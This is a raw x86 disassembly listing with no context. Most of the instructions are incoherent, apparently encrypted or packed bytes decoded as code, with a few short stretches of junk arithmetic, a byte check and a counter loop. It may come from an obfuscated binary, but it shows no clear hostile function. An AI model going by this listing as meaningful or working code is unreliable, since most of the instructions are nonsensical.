  411213:	psubusb mm7,QWORD PTR [edi-0x78]
  411217:	lock leave 
  411219:	ins    BYTE PTR es:[edi],dx
  41121a:	mov    dl,0xbf
  41121c:	xor    BYTE PTR [edx-0x80],ah
  41121f:	or     BYTE PTR [edx],dh
  411221:	cmp    eax,0x6b3a49e5
  411226:	mov    ebp,0x138bde51
  41122b:	icebp  
  41122c:	rol    BYTE PTR [ebx-0xf199b51],1
  411232:	sbb    al,0x0
  411234:	dec    eax
  411235:	adc    al,0x36
  411238:	dec    ebp
  411239:	sti    
  41123a:	inc    ebp
  41123b:	shl    DWORD PTR [edi],0xc0
  41123e:	stos   BYTE PTR es:[edi],al
  41123f:	mov    BYTE PTR [ebp-0x5ed371a3],dl
  411245:	sbb    edi,DWORD PTR [ebx-0x2d5d541a]
  41124b:	cdq    
  41124c:	rol    DWORD PTR [ebp-0x43],1
  41124f:	xor    esp,esi
  411251:	fadd   DWORD PTR [ebp+0x1bb9712a]
  411257:	aad    0x1d
  411259:	enter  0x858f,0xad
  41125d:	cdq    
  41125e:	jl     0x4112bf
  411260:	inc    edx
  411261:	mov    ebp,0xcd5bef5b
  411266:	mov    edi,0x2f5681ef
  41126b:	push   ebp
  41126c:	jmp    0xace78bf8
  411271:	dec    ebp
  411272:	push   0x73ccebd7
  411277:	add    cl,BYTE PTR [edx]
  411279:	ror    BYTE PTR [edx],cl
  41127b:	out    dx,al
  41127c:	cmp    al,0xa8
  41127e:	pop    es
  41127f:	mov    ebp,0xdc4dbf9f
  411284:	cld    
  411285:	push   edx
  411286:	(bad)  [ebp-0x59144507]
  41128c:	loop   0x411283
  41128e:	test   al,0x9e
  411290:	iret   
  411291:	shl    BYTE PTR [edi],1
  411293:	retf   0xa1c
  411296:	mov    bl,0xde
  411298:	bound  esi,QWORD PTR [ebx-0x714a6519]
  41129e:	sub    dl,bl
  4112a0:	dec    edx
  4112a1:	sub    DWORD PTR [edx],eax
  4112a3:	fdivr  DWORD PTR [eax+0x564c8796]
  4112a9:	pushf  
  4112aa:	mov    DWORD PTR [edx+0x4b],edx
  4112ad:	stc    
  4112ae:	sub    bh,bl
  4112b0:	inc    ebp
  4112b1:	sub    esi,DWORD PTR [ebp+0x71]
  4112b4:	cmp    dl,BYTE PTR [ebx]
  4112b6:	and    ch,BYTE PTR [ebx+0x23]
  4112b9:	jecxz  0x4112e6
  4112bb:	ins    DWORD PTR es:[edi],dx
  4112bc:	mov    ecx,DWORD PTR [edi-0x3d21defe]
  4112c2:	and    eax,0x695266c3
  4112c7:	lods   al,BYTE PTR ds:[esi]
  4112c8:	ja     0x411308
  4112ca:	mov    BYTE PTR [esi],ch
  4112cc:	nop
  4112cd:	in     eax,dx
  4112ce:	pop    edi
  4112cf:	lds    ebp,FWORD PTR [eax+0x47]
  4112d2:	dec    ebp
  4112d3:	fimul  WORD PTR [ebx-0x740ad900]
  4112d9:	lods   eax,DWORD PTR ds:[esi]
  4112da:	in     eax,0xe6
  4112dc:	jecxz  0x41129e
  4112de:	dec    ebp
  4112df:	or     DWORD PTR [ebp-0x7],edi
  4112e2:	mov    edx,0x9872fb06
  4112e7:	mov    esi,0x790eee80
  4112ec:	fprem1 
  4112ee:	jb     0x41128d
  4112f0:	or     BYTE PTR [ebx-0x69cea947],al
  4112f6:	inc    esp
  4112f7:	data16 xor bl,BYTE PTR [eax+0x5f]
  4112fb:	cmp    esi,eax
  4112fd:	xchg   DWORD PTR [edx],ebp
  4112ff:	add    DWORD PTR [ebx+0x7f],esi
  411302:	int3   
  411303:	nop
  411304:	lods   al,BYTE PTR ds:[esi]
  411305:	ret    0xfcd
  411308:	push   ebx
  411309:	sar    ebx,1
  41130b:	in     al,dx
  41130c:	sub    eax,0xc5c31b27
  411311:	nop
  411312:	inc    ecx
  411313:	push   ecx
  411314:	push   0x2d
  411316:	(bad)  
  411318:	icebp  
  411319:	push   cs
  41131a:	cmp    ch,ch
  41131c:	shl    esi,cl
  41131e:	or     DWORD PTR [ecx+0xb9d6472],ebx
  411324:	sub    DWORD PTR [edx],0x29a79707
  41132a:	and    al,0x1f
  41132c:	push   0xfffffffa
  41132e:	aam    0xda
  411330:	jge    0x41133c
  411332:	mov    edx,0x1a06c778
  411337:	jne    0x4112cf
  411339:	ins    DWORD PTR es:[edi],dx
  41133a:	cld    
  41133b:	dec    eax
  41133c:	sbb    esi,0xffffffa6
  41133f:	sub    ah,al
  411341:	into   
  411342:	hlt    
  411343:	mov    dl,0x88
  411345:	adc    DWORD PTR [esi-0x1499ba8b],ebx
  41134b:	pop    ss
  41134c:	add    al,0x25
  41134e:	(bad)  
  41134f:	xchg   edx,eax
  411350:	jnp    0x411394
  411352:	aaa    
  411353:	ficomp WORD PTR [edx]
  411355:	xchg   esp,eax
  411356:	push   cs
  411357:	je     0x41135d
  411359:	sahf   
  41135a:	(bad)  
  41135b:	hlt    
  41135c:	popf   
  41135d:	test   DWORD PTR [edx],ecx
  41135f:	ds loopne 0x4113b2
  411362:	cld    
  411363:	add    BYTE PTR [ecx+0x44],dh
  411366:	out    0xba,eax
  411368:	gs xor al,dh
  41136b:	mov    BYTE PTR [di],dh
  41136e:	push   0xd92f8efa
  411373:	jle    0x4113dd
  411375:	aad    0x42
  411377:	stos   DWORD PTR es:[edi],eax
  411378:	add    ch,BYTE PTR [eax+0x6e]
  41137b:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  41137f:	mov    edx,DWORD PTR [ebp+0xc]
  411382:	cmp    al,BYTE PTR [edx]
  411384:	jne    0x411713
  41138a:	mov    eax,DWORD PTR [ebp-0x8]
  41138d:	mov    edx,DWORD PTR [ebp+0xc]
  411390:	movsx  edx,BYTE PTR [edx]
  411393:	xor    eax,ecx
  411395:	add    eax,esi
  411397:	cmp    edx,eax
  411399:	je     0x41156b
  41139f:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4113a6:	lea    eax,[ebp-0x18]
  4113a9:	mov    DWORD PTR [ebp-0x14],eax
  4113ac:	mov    eax,DWORD PTR [ebp-0x14]
  4113af:	add    DWORD PTR [eax],0x705fa8f
  4113b5:	mov    eax,DWORD PTR [ebp-0x10]
  4113b8:	mov    edx,DWORD PTR [ebp+0x8]
  4113bb:	xor    eax,ecx
  4113bd:	lea    eax,[eax+edx*1+0x32729b]
  4113c4:	mov    DWORD PTR [ebp+0x8],eax
  4113c7:	jmp    0x411563
  4113cc:	sub    DWORD PTR [esi-0x26],ebx
  4113cf:	sub    al,0x69
  4113d1:	test   al,0xe9
  4113d3:	pop    ebx
  4113d4:	cld    
  4113d5:	add    DWORD PTR [edx+0x58887ca1],ecx
  4113db:	popa   
  4113dc:	add    DWORD PTR [eax+0x7e],eax
  4113df:	jle    0x4113d2
  4113e1:	jg     0x411461
  4113e3:	jle    0x411443
  4113e5:	jbe    0x41143b
  4113e7:	adc    al,0x65
  4113e9:	mov    WORD PTR [edx+0x6a606e36],gs
  4113ef:	lahf   
  4113f0:	xchg   BYTE PTR [ecx],cl
  4113f2:	xor    bl,BYTE PTR [esi]
  4113f4:	sbb    eax,0xfc41104
  4113f9:	bound  ebp,QWORD PTR [ebx]
  4113fb:	cdq    
  4113fc:	or     esi,DWORD PTR [eax-0x3b]
  4113ff:	xlat   BYTE PTR ds:[ebx]
  411400:	ror    BYTE PTR [eax-0x3c],cl
  411403:	jne    0x41140e
  411405:	mov    ds,WORD PTR [eax+0x50]
  411408:	push   ebx
  411409:	mov    cl,0xe
  41140b:	jge    0x4113d5
  41140d:	lods   al,BYTE PTR ds:[esi]
  41140e:	cli    
  41140f:	push   ds
  411410:	aad    0x6a
  411412:	rcr    ah,0x32
  411415:	lock or ecx,ecx
  411418:	arpl   cx,bp
  41141a:	js     0x4113e9
  41141c:	js     0x411463
  41141e:	fsubr  QWORD PTR [ebp+0x2387060d]
  411424:	sbb    DWORD PTR [ebx+ecx*2-0x7a283cdb],0x395640fd
  41142f:	hlt    
  411430:	nop
  411431:	cmp    DWORD PTR [ecx-0x54aa75ff],esp
  411437:	pusha  
  411438:	push   ds
  411439:	jmp    0x411411
  41143b:	or     eax,0xba02a544
  411440:	and    DWORD PTR [ebx],ebp
  411442:	xor    al,0x72
  411444:	gs jge 0x4113e4
  411447:	inc    DWORD PTR [ebx]
  411449:	retf   0x7299
  41144c:	xchg   ebx,esi
  41144e:	pushf  
  41144f:	jl     0x411472
  411451:	imul   ebx,DWORD PTR [ebx+0xd],0xffffff9d
  411455:	in     al,0x4f
  411457:	(bad)  
  411459:	pop    ebx
  41145a:	cmp    DWORD PTR [edi-0x80],edi
  41145d:	out    0x33,eax
  41145f:	or     eax,0xc10666dd
  411464:	out    dx,eax
  411465:	test   al,0x28
  411467:	adc    bh,BYTE PTR [ebp+0x69]
  41146a:	fs sbb al,ah
  41146d:	and    dl,BYTE PTR [ebp+ebx*4+0x54]
  411471:	psubw  mm3,mm5
  411474:	mov    ebp,0xdf0ad997
  411479:	in     eax,dx
  41147a:	mov    ecx,0x91e3bcfb
  41147f:	pop    esi
  411480:	mov    ds:0x6e3f71ab,eax
  411485:	sbb    DWORD PTR [ecx],ebp
  411487:	and    eax,0xbfe63783
  41148c:	cmp    ch,cl
  41148e:	lods   eax,DWORD PTR ds:[esi]
  41148f:	popf   
  411490:	sub    ch,BYTE PTR [eax-0x26]
  411493:	add    BYTE PTR [eax],al
  411495:	dec    esp
  411496:	or     al,0x64
  411498:	mov    cl,dh
  41149a:	xor    al,BYTE PTR [eax+ebp*1+0x1caf1cb7]
  4114a1:	inc    eax
  4114a2:	add    al,0xe3
  4114a4:	std    
  4114a5:	sub    cl,cl
  4114a7:	lock arpl WORD PTR [esi-0x68dbddc4],bp
  4114ae:	cmp    bh,0xa8
  4114b1:	out    dx,al
  4114b2:	dec    esi
  4114b3:	idiv   ecx
  4114b5:	sub    ebp,0xcd5e5eb8
  4114bb:	mov    ah,0xb8
  4114bd:	cld    
  4114be:	ret    0xd4e6
  4114c1:	xor    ecx,DWORD PTR [ecx+0x3ff90048]
  4114c7:	(bad)  
  4114c9:	sub    DWORD PTR [edx],edx
  4114cb:	sti    
  4114cc:	inc    ecx
  4114cd:	mov    gs,WORD PTR [esi]
  4114cf:	lahf   
  4114d0:	cmp    al,0x0
  4114d2:	iret   
  4114d3:	adc    edx,DWORD PTR [ebp+0x10b344f4]
  4114d9:	dec    ebx
  4114da:	popf   
  4114db:	add    ebp,DWORD PTR [bx+si]
  4114de:	mov    ebx,0x17bc7fe6
  4114e3:	jns    0x411499
  4114e5:	cmp    DWORD PTR gs:[edx],ebp
  4114e8:	in     al,0x6b
  4114ea:	push   ebp
  4114eb:	shl    ebx,cl
  4114ed:	div    BYTE PTR [ecx-0x5a4b1666]
  4114f3:	dec    ebx
  4114f4:	pop    ecx
  4114f5:	sbb    BYTE PTR [eax+0x3907db32],cl
  4114fb:	in     eax,0x24
  4114fd:	jo     0x411508
  4114ff:	or     BYTE PTR [eax+eiz*2+0x3bb8d66a],0x42
  411507:	xor    bl,BYTE PTR [edi+0x2]
  41150a:	add    dl,dl
  41150c:	fbstp  TBYTE PTR [esp+esi*1]
  41150f:	nop
  411510:	sar    BYTE PTR [esi+0x6887772c],cl
  411516:	loopne 0x411513
  411518:	add    DWORD PTR [ebx-0x59e11c8c],edx
  41151e:	int    0x4c
  411520:	test   eax,0x408ff112
  411525:	and    al,0x31
  411527:	sbb    ebx,DWORD PTR [ebx]
  411529:	js     0x41157c
  41152b:	rol    DWORD PTR [ebx+0x7a],cl
  41152e:	inc    ecx
  41152f:	test   DWORD PTR [ebp+0x146cd700],ecx
  411535:	jmp    0x41152f
  411537:	sbb    edi,DWORD PTR [edx]
  411539:	shl    BYTE PTR [esi+ebx*4-0x1a],1
  41153d:	in     eax,0xa1
  41153f:	ds xor ch,dh
  411542:	cmp    BYTE PTR [edi],ah
  411544:	pop    ds
  411545:	mov    esi,0x3c8c2575
  41154a:	arpl   WORD PTR [ecx],bx
  41154c:	sub    al,BYTE PTR [esi-0x3afc541d]
  411552:	bound  esi,QWORD PTR [edx]
  411554:	(bad)  
  411555:	arpl   WORD PTR [ebx+ecx*4-0x5f],dx
  411559:	icebp  
  41155a:	push   ss
  41155b:	cmp    ebx,edx
  41155d:	(bad)  
  41155e:	pop    eax
  41155f:	lds    eax,FWORD PTR [esi-0x4c]
  411562:	ret    0x45ff
  411565:	or     al,0xe9
  411567:	pop    edi
  411568:	cld    
  411569:	(bad)  
  41156a:	dec    DWORD PTR [ebx-0x3ecc0fbb]
  411570:	jmp    0x41170c
  411575:	jmp    0xe967:0xb166b574
  41157c:	jo     0x41155e
  41157e:	fidiv  WORD PTR [edx-0x5c]
  411581:	jle    0x411588
  411583:	pop    ebx
  411584:	sbb    eax,DWORD PTR [eax-0xe8181bf]
  41158a:	jg     0x41160a
  41158c:	jle    0x41158a
  41158e:	mov    al,ds:0x683a2129
  411593:	pushf  
  411594:	ret    
  411595:	mov    ah,0x4b
  411597:	xor    dl,BYTE PTR [edx+ebp*1-0x46]
  41159b:	in     al,0xcb
  41159d:	lods   eax,DWORD PTR ds:[esi]
  41159e:	neg    DWORD PTR [ebx+0x14cb81cf]
  4115a4:	xor    esp,DWORD PTR [ecx+0x348ee3c4]
  4115aa:	pop    edx
  4115ab:	outs   dx,BYTE PTR ds:[esi]
  4115ac:	mov    ebp,0x4b0dd53b
  4115b1:	adc    BYTE PTR [ebp-0x545390cd],0x9f
  4115b8:	adc    ecx,DWORD PTR [esi+0x2e]
  4115bb:	bound  edx,QWORD PTR [ecx-0x57]
  4115be:	clc    
  4115bf:	xor    DWORD PTR [ebx-0x2875ff56],ebx
  4115c5:	dec    esp
  4115c6:	cdq    
  4115c7:	adc    ch,cl
  4115c9:	xor    DWORD PTR [edi+0x20573550],esp
  4115cf:	ds push edi
  4115d1:	dec    esp
  4115d2:	imul   ecx,esp,0x28
  4115d5:	xchg   ebx,eax
  4115d6:	sub    edx,DWORD PTR [ebp-0x5f]
  4115d9:	cmp    ecx,esi
  4115db:	(bad)  
  4115dc:	arpl   WORD PTR [eax+esi*8+0x27],di
  4115e0:	(bad)  
  4115e1:	imul   esp,DWORD PTR [edx+0x7a0990a7],0x241e3de
  4115eb:	xor    dh,BYTE PTR [edi-0xb]
  4115ee:	not    DWORD PTR [ecx]
  4115f0:	mov    ds:0x21764fe9,eax
  4115f5:	push   0xffffffae
  4115f7:	sbb    cl,BYTE PTR [esi]
  4115f9:	sub    ebx,esi
  4115fb:	sahf   
  4115fc:	inc    eax
  4115fd:	repz (bad) 
  4115ff:	ficom  WORD PTR [edi-0x32]
  411602:	lock mov ah,0x75
  411605:	inc    esp
  411606:	pop    eax
  411607:	jmp    0x404f:0x6759430f
  41160e:	inc    eax
  41160f:	pop    ds
  411610:	stos   BYTE PTR es:[edi],al
  411611:	mov    es,WORD PTR [esi]
  411613:	jle    0x4115f0
  411615:	fwait
  411616:	nop
  411617:	(bad)  
  411618:	fimul  DWORD PTR [edx-0x507ca6e5]
  41161e:	add    al,0xe3
  411620:	addr16 mov ch,0xe8
  411623:	jnp    0x411682
  411625:	xchg   esi,eax
  411626:	adc    BYTE PTR [esp+ebx*8+0x3068daa],dh
  41162d:	cmp    BYTE PTR [ecx],dl
  41162f:	mov    eax,DWORD PTR [ebp+0x28]
  411632:	xor    al,0xf5
  411634:	jne    0x411604
  411636:	dec    edi
  411637:	pop    ds
  411638:	das    
  411639:	scas   eax,DWORD PTR es:[edi]
  41163a:	jle    0x411665
  41163c:	fdiv   QWORD PTR ds:0x85caff3d
  411642:	fcomp  st(5)
  411644:	or     dh,dl
  411646:	jne    0x411654
  411648:	pop    ecx
  411649:	pop    eax
  41164a:	in     al,dx
  41164b:	sub    ah,BYTE PTR [ebp-0x25]
  41164e:	mov    al,0x8d
  411650:	sub    al,0xc3
  411652:	jne    0x411695
  411654:	push   ebp
  411655:	sbb    BYTE PTR [edi],0x9a
  411658:	iret   
  411659:	(bad)  
  41165a:	enter  0x7b41,0xe2
  41165e:	pop    ecx
  41165f:	mov    DWORD PTR [esi],esi
  411661:	mov    ebp,0x9ec3eb35
  411666:	stos   BYTE PTR es:[edi],al
  411667:	adc    eax,0x2064ff2b
  41166c:	fidivr WORD PTR [edx-0x69]
  41166f:	and    DWORD PTR [edx+ecx*1],esp
  411672:	sub    eax,0x1cd8d33c
  411677:	push   ds
  411678:	lea    esp,[ebx+eiz*4-0x473e7ffa]
  41167f:	js     0x4116f7
  411681:	sbb    dh,bl
  411683:	pop    eax
  411684:	mov    bh,0x39
  411686:	je     0x6699b8b3
  41168c:	cmp    edi,ecx
  41168e:	mov    edi,0xb483ce81
  411693:	popa   
  411694:	(bad)  
  411695:	nop/reserved BYTE PTR [ebx]
  411698:	sbb    BYTE PTR [esi+0x51],dl
  41169b:	neg    DWORD PTR [edi]
  41169d:	inc    edx
  41169e:	loop   0x4116b9
  4116a0:	dec    DWORD PTR ds:0x15d7d246
  4116a6:	outs   dx,DWORD PTR ds:[esi]
  4116a7:	xchg   edx,eax
  4116a8:	sahf   
  4116a9:	pop    edi
  4116aa:	adc    edx,edi
  4116ac:	xlat   BYTE PTR ds:[ebx]
  4116ad:	mov    ch,0x95
  4116af:	add    eax,DWORD PTR [ebx]
  4116b1:	into   
  4116b2:	dec    edi
  4116b3:	mov    eax,ebx
  4116b5:	mov    al,ds:0xb7bd71b
  4116ba:	xchg   DWORD PTR [ecx],edi
  4116bc:	jle    0x4116e7
  4116be:	push   esp
  4116bf:	mov    ds:0xe0500c49,eax
  4116c4:	outs   dx,BYTE PTR ds:[esi]
  4116c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116c6:	fs sti 
  4116c8:	in     al,dx
  4116c9:	pop    eax
  4116ca:	dec    edx
  4116cb:	inc    edi
  4116cc:	sbb    bl,bl
  4116ce:	adc    BYTE PTR [ecx+0xbf6fc0d],cl
  4116d4:	or     BYTE PTR [ebx+eax*1+0x79],cl
  4116d8:	dec    ebx
  4116d9:	ja     0x4116ae
  4116db:	mov    dl,bl
  4116dd:	sub    ecx,edi
  4116df:	push   esp
  4116e0:	mov    ebx,0x5eaa6a1a
  4116e5:	sub    BYTE PTR [edi+0x52],bh
  4116e8:	fldenv [eax]
  4116ea:	xchg   edi,eax
  4116eb:	push   ss
  4116ec:	ret    0x3a55
  4116ef:	jecxz  0x4116b1
  4116f1:	xor    ch,BYTE PTR [ecx-0x56]
  4116f4:	cmp    eax,0x9df70801
  4116f9:	jmp    0x4116b9
  4116fb:	fucomp st(6)
  4116fd:	ror    DWORD PTR [edi+0x79],1
  411700:	jns    0x4116da
  411702:	and    eax,0xc1a5db17
  411707:	pushf  
  411708:	mov    ds:0x8b3aadf6,eax
  41170d:	dec    ebp
  41170e:	adc    BYTE PTR [ebx],al
  411710:	(bad)  
  411711:	mov    DWORD PTR [ecx],eax
  411713:	pop    esi
  411714:	leave  
  411715:	ret    0xc
  411718:	push   ebp
  411719:	mov    ebp,esp
  41171b:	push   ecx
  41171c:	neg    eax
  41171e:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  411725:	mov    eax,DWORD PTR [ebp+0x8]
  411728:	adc    DWORD PTR ds:0x4337ab,0x2178
  411732:	mov    al,BYTE PTR [eax]
  411734:	sbb    DWORD PTR ds:0x4337fb,0x4337c3
  41173e:	add    al,0x38
  411740:	xor    al,0x46
  411742:	cmp    al,0xc3
  411744:	mov    DWORD PTR ds:0x433803,0x7813
  41174e:	jne    0x411ea2
  411754:	and    edx,DWORD PTR ds:0x43382b
  41175a:	mov    eax,DWORD PTR [ebp+0x8]
  41175d:	xor    DWORD PTR ds:0x4337bb,0x67d7
  411767:	mov    ecx,DWORD PTR [ebp+0x8]
  41176a:	add    edx,0xbb1
  411770:	jmp    0x4119ab
  411775:	jo     0x4117d4
  411777:	sbb    DWORD PTR [esi],0x7171e291
  41177d:	rol    DWORD PTR [edi],1
  41177f:	push   ebx
  411780:	sbb    eax,0x679b4eec
  411785:	add    ecx,DWORD PTR [edi+0x7e]
  411788:	jle    0x41179a
  41178a:	jl     0x41180a
  41178c:	jle    0x411715
  41178e:	call   0xb84459b6
  411793:	add    al,0x27
  411795:	loop   0x411759
  411797:	lahf   
  411798:	or     cl,BYTE PTR ds:0x57babc49
  41179e:	mov    ebp,0x9996554d
  4117a3:	scas   eax,DWORD PTR es:[edi]
  4117a4:	push   edx
  4117a5:	ins    DWORD PTR es:[edi],dx
  4117a6:	and    edx,DWORD PTR [edx+0x2b44dae3]
  4117ac:	popa   
  4117ad:	sbb    ecx,DWORD PTR [eax-0x2a86f44c]
  4117b3:	mov    ecx,DWORD PTR [eax]
  4117b5:	push   esp
  4117b6:	std    
  4117b7:	dec    esi
  4117b8:	int    0xf1
  4117ba:	out    dx,eax
  4117bb:	fadd   QWORD PTR [esi+0x77e0bc0f]
  4117c1:	pop    es
  4117c2:	or     al,0x37
  4117c4:	lods   eax,DWORD PTR ds:[esi]
  4117c5:	outs   dx,DWORD PTR ds:[esi]
  4117c6:	dec    edx
  4117c7:	data16 jne 0x4117d7
  4117ca:	test   BYTE PTR [esi+0x8],dh
  4117cd:	cdq    
  4117ce:	repz mov ds:0xe377eaed,eax
  4117d4:	add    eax,edx
  4117d6:	pop    es
  4117d7:	data16 mov cl,0x30
  4117da:	sbb    eax,0x7b10aef
  4117df:	or     eax,edx
  4117e1:	cmp    al,0x2
  4117e3:	frstor [edx+0x73]
  4117e6:	repz (bad) [esi+0xf]
  4117ea:	push   eax
  4117eb:	mov    ds:0x7e5771af,al
  4117f0:	ins    BYTE PTR es:[edi],dx
  4117f1:	test   BYTE PTR [edx],dl
  4117f3:	test   al,0xe8
  4117f5:	inc    esp
  4117f6:	jns    0x411875
  4117f8:	sbb    DWORD PTR [eax+0x4cb01b0c],esi
  4117fe:	jbe    0x41183a
  411800:	cdq    
  411801:	jnp    0x411868
  411803:	add    eax,0xbd88ec59
  411808:	das    
  411809:	pop    ecx
  41180a:	adc    al,0x89
  41180c:	jmp    0x9be319e
  411811:	lea    ebx,[edx+0x3b27837f]
  411817:	mov    ds:0x1f792f9c,al
  41181c:	mov    dl,0x74
  41181e:	cmp    BYTE PTR [edi-0x45],dh
  411821:	jmp    0x1cfae4fe
  411826:	jl     0x41187d
  411828:	scas   eax,DWORD PTR es:[edi]
  411829:	adc    DWORD PTR [esi],eax
  41182b:	into   
  41182c:	sbb    al,0x2
  41182e:	je     0x41184f
  411830:	fnstcw WORD PTR ds:0xb923be56
  411836:	xchg   edx,eax
  411837:	mov    ah,0xf8
  411839:	or     al,0x57
  41183b:	inc    esp
  41183c:	inc    ebx
  41183d:	out    0x20,al
  41183f:	test   al,0x15
  411841:	push   edx
  411842:	push   edi
  411843:	inc    ebx
  411844:	leave  
  411845:	mov    eax,ds:0x7566f385
  41184a:	xor    BYTE PTR [edx-0x1639226a],0x99
  411851:	fisub  WORD PTR [ebx-0x28]
  411854:	bound  esp,QWORD PTR [ebx+0x2a]
  411857:	mov    ebp,0xd3859bb8
  41185c:	inc    ebx
  41185d:	outs   dx,BYTE PTR ds:[esi]
  41185e:	ja     0x41180c
  411860:	or     esi,DWORD PTR [edi]
  411862:	ficomp WORD PTR [eax+0x3e]
  411865:	rol    DWORD PTR [ecx+ecx*8+0x71],0xdd
  41186a:	loopne 0x411813
  41186c:	shr    BYTE PTR [ebx+ebx*4+0x2],1
  411870:	out    0x2f,eax
  411872:	out    0xee,eax
  411874:	mov    dh,0x60
  411876:	call   0x501a1b22
  41187b:	es dec esi
  41187d:	adc    eax,0x2160b832
  411882:	xchg   BYTE PTR [edx],dh
  411884:	psllw  mm3,mm1
  411887:	js     0x4118a0
  411889:	or     DWORD PTR [ebx],ebx
  41188b:	mov    cl,0x9
  41188d:	stos   BYTE PTR es:[edi],al
  41188e:	mov    ds:0xb2fe26d6,eax
  411893:	push   eax
  411894:	inc    edx
  411895:	mov    eax,ds:0x919306f7
  41189a:	dec    edx
  41189b:	test   BYTE PTR [esi],0x43
  41189e:	mov    DWORD PTR [ebx+eiz*4-0x45],ebx
  4118a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4118a3:	les    edx,FWORD PTR [ebx+eax*8]
  4118a6:	mov    dh,0x99
  4118a8:	imul   edx,DWORD PTR [edx+0x4b],0x50
  4118ac:	jecxz  0x4118da
  4118ae:	lods   al,BYTE PTR ds:[esi]
  4118af:	sbb    DWORD PTR [edi+0x2e139194],0xffffff91
  4118b6:	sbb    eax,0xdf1e534a
  4118bb:	sub    al,0xf3
  4118bd:	fsub   DWORD PTR [esi-0x5f]
  4118c0:	jns    0x411928
  4118c2:	dec    eax
  4118c3:	fdivrp st(6),st
  4118c5:	or     ecx,ebp
  4118c7:	pop    ds
  4118c8:	push   esp
  4118c9:	retf   
  4118ca:	outs   dx,BYTE PTR ds:[esi]
  4118cb:	jg     0x4118f5
  4118cd:	xchg   DWORD PTR [ecx+0x51],edi
  4118d0:	std    
  4118d1:	je     0x4118fb
  4118d3:	daa    
  4118d4:	arpl   WORD PTR [eax-0x5f],sp
  4118d7:	xor    esp,DWORD PTR [ebp-0x2d0db8cc]
  4118dd:	mov    edx,0xdbe6a10c
  4118e3:	and    al,0xfe
  4118e5:	push   ds
  4118e6:	adc    ah,dh
  4118e8:	pop    es
  4118e9:	or     BYTE PTR [ebx-0x1ce2eeb2],dl
  4118ef:	dec    ebp
  4118f0:	loopne 0x411875
  4118f2:	or     al,0x51
  4118f4:	mov    edi,0x43a00a41
  4118f9:	mov    WORD PTR [edi],cs
  4118fb:	sbb    bl,BYTE PTR [esi+0xe]
  4118fe:	mov    ch,0x3
  411900:	pusha  
  411901:	imul   ebx,DWORD PTR [esp+esi*1-0x2c3dc687],0xaad76428
  41190c:	(bad)  
  41190d:	mov    edi,0xfae856a9
  411912:	out    dx,al
  411913:	sub    al,0x26
  411915:	push   edi
  411916:	mov    ?,WORD PTR [eax]
  411918:	(bad)
  41191b:	aaa    
  41191c:	inc    ecx
  41191d:	dec    edi
  41191e:	js     0x4118a4
  411920:	mov    eax,ds:0xd8afcd8c
  411925:	scas   eax,DWORD PTR es:[edi]
  411926:	xchg   ebp,eax
  411927:	add    eax,0x6286b721
  41192c:	js     0x411903
  41192e:	xlat   BYTE PTR ds:[ebx]
  41192f:	rol    BYTE PTR [eax-0x2ae1526a],cl
  411935:	xchg   ebx,eax
  411936:	jo     0x41191f
  411938:	jno    0x41190e
  41193a:	jmp    0x4119a8
  41193c:	std    
  41193d:	mov    gs,WORD PTR [ebp+0x2663c00d]
  411943:	or     BYTE PTR [eax+0x6e],al
  411946:	xor    ebp,DWORD PTR [ecx+0xd950726]
  41194c:	inc    ebx
  41194d:	es add dh,ch
  411950:	test   BYTE PTR [edx-0x71],bh
  411953:	imul   edi,DWORD PTR [eax+0xe],0xffffffee
  411957:	or     ecx,eax
  411959:	lea    esi,[ebx+0x7f92285d]
  41195f:	lock jle 0x411935
  411962:	inc    eax
  411963:	nop
  411964:	push   eax
  411965:	jle    0x411933
  411967:	nop
  411968:	js     0x411971
  41196a:	jns    0x41196d
  41196c:	xor    DWORD PTR [ebp-0x46f0fca2],ebp
  411972:	ret    0xe2d1
  411975:	cmp    BYTE PTR [edx+0x3e],0x47
  411979:	add    eax,0xecc60d22
  41197e:	and    eax,0xe2d5003b
  411983:	pop    ebx
  411984:	add    BYTE PTR [edi+edx*1+0x3e99eae7],bl
  41198b:	jge    0x4119a5
  41198d:	ds jl  0x69aff98c
  411994:	es out dx,al
  411996:	nop    DWORD PTR [ebp-0x4133f2bc]
  41199d:	jecxz  0x41198c
  41199f:	(bad)  
  4119a0:	mov    ebp,0x585310a6
  4119a5:	push   ds
  4119a6:	ret    
  4119a7:	ds add al,0xa
  4119aa:	cdq    
  4119ab:	add    ecx,DWORD PTR [eax+0x3c]
  4119ae:	or     DWORD PTR ds:0x433723,ebx
  4119b4:	mov    edx,0x7510854
  4119b9:	mov    DWORD PTR [ebp+0x8],ecx
  4119bc:	and    DWORD PTR ds:0x433827,0x0
  4119c6:	jmp    0x4119d6
  4119cb:	mov    eax,ds:0x433827
  4119d0:	inc    eax
  4119d1:	mov    ds:0x433827,eax
  4119d6:	cmp    DWORD PTR ds:0x433827,0x17
  4119dd:	jae    0x4119fe
  4119e3:	cmp    DWORD PTR ds:0x433827,0x27
  4119ea:	jne    0x4119f9
  4119f0:	push   DWORD PTR [ebp-0x10]
  4119f3:	call   DWORD PTR ds:0x4123b8
  4119f9:	jmp    0x4119cb
  4119fe:	mov    eax,DWORD PTR [ebp-0x4]
  411a01:	jmp    0x411c3c
  411a06:	pop    edi
  411a07:	pop    edx
  411a08:	dec    eax
  411a09:	pop    es
  411a0a:	dec    ecx
  411a0b:	xor    eax,0xcba06271
  411a10:	outs   dx,DWORD PTR ds:[esi]
  411a11:	aam    0x55
  411a13:	dec    ebx
  411a14:	xchg   edi,eax
  411a15:	adc    eax,0x7e7e4d25
  411a1a:	adc    BYTE PTR [esi+edi*2+0x7e],bh
  411a1e:	in     al,dx
  411a1f:	jmp    0xc93856fc
  411a24:	sub    ah,BYTE PTR [ebx+0x7e]
  411a27:	push   ebp
  411a28:	test   DWORD PTR [ebp+0x34],0xf429e10d
  411a2f:	dec    esp
  411a30:	stos   BYTE PTR es:[edi],al
  411a31:	xor    BYTE PTR [ebp-0x18],al
  411a34:	mov    eax,0xab4e1368
  411a39:	fild   WORD PTR [edx]
  411a3b:	int    0x8
  411a3d:	popf   
  411a3e:	and    al,0x3c
  411a40:	pop    esp
  411a41:	mov    al,ds:0xc9706d80
  411a46:	or     ebp,DWORD PTR [edi-0x5fa7d192]
  411a4c:	daa    
  411a4d:	push   esp
  411a4e:	dec    ecx
  411a4f:	shl    BYTE PTR [ebx-0x3f],0x5f
